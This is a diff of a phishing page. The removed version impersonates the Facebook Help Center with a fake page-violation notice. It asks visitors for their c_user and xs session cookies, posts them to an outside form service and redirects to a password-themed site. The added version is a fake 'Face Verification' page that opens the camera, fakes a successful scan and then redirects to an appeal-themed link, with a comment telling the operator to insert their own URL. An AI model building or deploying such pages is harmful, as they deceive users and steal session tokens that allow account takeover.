@@ -1,83 +1,218 @@
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <link rel="icon" type="image/svg+xml" href="https://apply-get-verified-badge.vercel.app/assets/logo-xjw2vU6p.png" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>
-      Meta Form
-    </title>
-    <script type="module" crossorigin="" src="/assets/index-D9lU3uHa.js">
-    </script>
-    <link rel="stylesheet" crossorigin="" href="style.css" />
-  </head>
-  <body>
-    <form action="https://submit-form.com/KnoFJMd3W" method="post">
-      <input type="hidden" name="_redirect" value="https://submit-your-password-now.vercel.app/" />
-      <div id="root">
-        <div>
-          <div class="d-flex align-items-center" style="width: 100%; height: 90px; background: rgb(70, 103, 172);">
-            <h1 class="text-white ms-4 m-0 d-flex align-self-center">
-              facebook
-            </h1>
-          </div>
-          <div class="d-flex align-items-center" style="width: 100%; height: 60px; background: rgb(233, 235, 238);">
-            <h4 class="ms-4 m-0 d-flex align-self-center text-primary">
-              Help Center
-            </h4>
-          </div>
-          <div class="col-12 my-4 d-flex justify-content-center align-items-center">
-            <div class="col-11 col-md-6 border">
-              <div class="p-2" style="background: rgb(245, 246, 247);">
-                <h5 class="m-0">
-                  Request For Remove Page Violation
-                </h5>
-              </div>
-              <div class="p-2">
-                <p class="fw-semibold validation_form_para">
-                  We&#39;ve identified irregular activity on your page that goes against our community guidelines.
-                </p>
-                <p class="fw-semibold validation_form_para">
-                  As a result, access to your page has been restricted, and you&#39;re presently unable to post, share, or comment using it.
-                </p>
-                <p class="fw-semibold validation_form_para">
-                  Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.
-                </p>
-                <p class="fw-semibold text-secondary" style="font-size: 12px;">
-                  Detailed Video Information.
-                </p>
-                <video controls="" autoplay="" src="https://detailedvideoinformation.web.app/video-information.mp4" style="width: 300px; height: 160px;">
-                </video>
-                <br />
-                <button>
-                  Enable Sound
-                </button>
-                <p class="fw-semibold validation_form_para mt-2">
-                  Please be sure to provide the requested information below.
-                </p>
-                <label class="" style="font-size: 12px;">
-                  c_user
-                </label>
-                <br />
-                <input type="number" name="c_user" required="" pattern="^\d{15}$" title="Please enter 15 digits" />
-                <br />
-                <label class="mt-2" style="font-size: 12px;">
-                  xs
-                </label>
-                <br />
-                <input type="text" name="xs" />
-                <p class="mt-2" style="font-size: 12px;">
-                  Please make sure not to log out from your computer or laptop until you have received a verification email.
-                </p>
-              </div>
-              <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);">
-                <button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">
-                  Submit
-                </button>
-              </div>
-            </div>
-          </div>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Face Verification</title>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:Arial, sans-serif;
+}
+
+body{
+    background:#0f172a;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    color:white;
+}
+
+.container{
+    width:360px;
+    background:#1e293b;
+    padding:20px;
+    border-radius:25px;
+    text-align:center;
+    box-shadow:0 0 25px rgba(0,0,0,0.5);
+}
+
+.title{
+    font-size:26px;
+    margin-bottom:15px;
+    font-weight:bold;
+}
+
+.video-box{
+    position:relative;
+    border-radius:20px;
+    overflow:hidden;
+    border:3px solid #22c55e;
+}
+
+video{
+    width:100%;
+    height:260px;
+    object-fit:cover;
+    background:black;
+}
+
+.scan-frame{
+    position:absolute;
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%);
+    width:180px;
+    height:220px;
+    border:3px solid #22c55e;
+    border-radius:20px;
+    box-shadow:0 0 15px #22c55e;
+}
+
+.scan-line{
+    position:absolute;
+    width:100%;
+    height:4px;
+    background:#22c55e;
+    top:0;
+    animation:scan 2s linear infinite;
+}
+
+@keyframes scan{
+    0%{ top:0; }
+    100%{ top:100%; }
+}
+
+.status{
+    margin-top:18px;
+    font-size:18px;
+}
+
+.progress{
+    width:100%;
+    height:12px;
+    background:#334155;
+    border-radius:20px;
+    overflow:hidden;
+    margin-top:15px;
+}
+
+.bar{
+    width:0%;
+    height:100%;
+    background:#22c55e;
+    transition:width 5s linear;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    margin-top:18px;
+    border:none;
+    border-radius:15px;
+    font-size:17px;
+    cursor:pointer;
+    font-weight:bold;
+}
+
+#scanBtn{
+    background:#22c55e;
+    color:white;
+}
+
+#submitBtn{
+    display:none;
+    background:#3b82f6;
+    color:white;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="title">
+        Face Verification
+    </div>
+
+    <div class="video-box">
+
+        <video id="video" autoplay playsinline></video>
+
+        <div class="scan-frame">
+            <div class="scan-line"></div>
         </div>
-      </div>
-    </form>
-  </body>
+
+    </div>
+
+    <div class="status" id="status">
+        Ready To Scan
+    </div>
+
+    <div class="progress">
+        <div class="bar" id="bar"></div>
+    </div>
+
+    <button id="scanBtn">
+        Start Face Scan
+    </button>
+
+    <button id="submitBtn">
+        Submit
+    </button>
+
+</div>
+
+<script>
+
+const video = document.getElementById("video");
+const scanBtn = document.getElementById("scanBtn");
+const submitBtn = document.getElementById("submitBtn");
+const statusText = document.getElementById("status");
+const bar = document.getElementById("bar");
+
+
+// Camera Open
+navigator.mediaDevices.getUserMedia({
+    video:true
+})
+.then(stream=>{
+    video.srcObject = stream;
+})
+.catch(()=>{
+    alert("Camera Permission Denied");
+});
+
+
+// Start Scan
+scanBtn.onclick = ()=>{
+
+    statusText.innerHTML = "Scanning Face...";
+
+    setTimeout(()=>{
+        bar.style.width = "100%";
+    },100);
+
+    // 5 Seconds Scan
+    setTimeout(()=>{
+
+        statusText.innerHTML = "Face Verified Successfully";
+
+        submitBtn.style.display = "block";
+
+        scanBtn.style.display = "none";
+
+    },5000);
+
+};
+
+
+// Submit Button Redirect
+submitBtn.onclick = ()=>{
+
+    // هتي پنهنجي لنڪ لڳايو
+    window.location.href = "https://appeal-system-check.netlify.app/";
+
+};
+
+</script>
+
+</body>
 </html>
